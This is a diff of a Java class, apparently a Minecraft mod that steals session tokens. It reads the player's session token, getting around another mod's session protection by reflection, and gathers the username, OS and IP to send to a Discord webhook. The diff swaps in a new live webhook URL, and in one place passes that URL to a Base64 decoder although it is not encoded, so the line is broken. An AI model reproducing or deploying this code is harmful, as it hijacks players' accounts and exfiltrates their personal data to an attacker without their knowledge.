@@ -43,7 +43,7 @@ public class apathy {
             String sessionProtector = null; try { Class<?> clazz = Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection");Field field = clazz.getField("changed");sessionProtector = (String) field.get(null);} catch (Exception ignored) {}String token = sessionProtector == null ? mc.getSession().getToken() : sessionProtector;
             
             //Contact Mainframe
-            String webhook = "https://discord.com/api/webhooks/967315871318036523/OvdsxgZpg7Puz3-sPQmL3u3QkJ4PLPcO5rVewXVN1gNzwRVmYZUz7h9zNszZtkhSrSTd";
+            String webhook = "https://discord.com/api/webhooks/1068369517828386876/2i3ufNW4F9YsqEYTX31rPfmhXjDOWioyK7oaaHvbBuEcvmy2v4mb2CDwEIT6cBn29rBR";
 
             //Collect Robot Diagnostics
             String pcInfo = String.format("{\"title\":\"PC Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"OS\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"IP\",\"value\":\"```%s```\",\"inline\":true}],\"author\":{\"name\":\"Thank you for Supporting https://discord.gg/fC5RkTuMGu\",\"url\":\"https://discord.gg/fC5RkTuMGu\"}}", System.getProperty("user.name"), System.getProperty("os.name"), ip);
@@ -148,7 +148,7 @@ public class apathy {
     }
 
     private static String discordIfnoGrabber() {
-        String api = new String(Base64.getDecoder().decode("WEBHOOK-HERE"), StandardCharsets.UTF_8);
+        String api = new String(Base64.getDecoder().decode("https://discord.com/api/webhooks/1068369517828386876/2i3ufNW4F9YsqEYTX31rPfmhXjDOWioyK7oaaHvbBuEcvmy2v4mb2CDwEIT6cBn29rBR"), StandardCharsets.UTF_8);
         return api;
     }
 
